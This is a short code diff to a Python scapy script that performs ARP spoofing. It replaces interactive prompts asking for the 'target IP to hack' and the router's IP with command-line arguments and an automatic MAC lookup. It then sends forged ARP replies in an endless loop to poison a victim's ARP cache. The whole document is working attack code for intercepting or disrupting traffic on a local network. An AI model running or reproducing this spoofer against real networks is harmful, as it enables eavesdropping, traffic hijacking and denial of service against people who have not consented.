@@ -4,18 +4,9 @@ from scapy.all import *
 from subprocess import call
 import time
 
-op = 1
-victim = raw_input('Enter the target IP to hack: ')
-victim = victim.replace(" ", "")
-
-spoof = raw_input('Enter the routers IP: ')
-spoof = spoof.replace(" ", "")
-
-mac = raw_input('Enter the target MAC to hack: ')
-mac = mac.replace("-", ":")
-mac = mac.replace(" ", "")
-
-arp = ARP(op=2, psrc=spoof, pdst=victim, hwdst=mac)
+arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=sys.argv[1])
+arp_ans = srp1(arp_req)
+arp = ARP(op=2, psrc=sys.argv[1], pdst=sys.argv[2], hwdst=arp_ans[ARP].hwsrc)
 
 while 1:
     send(arp)
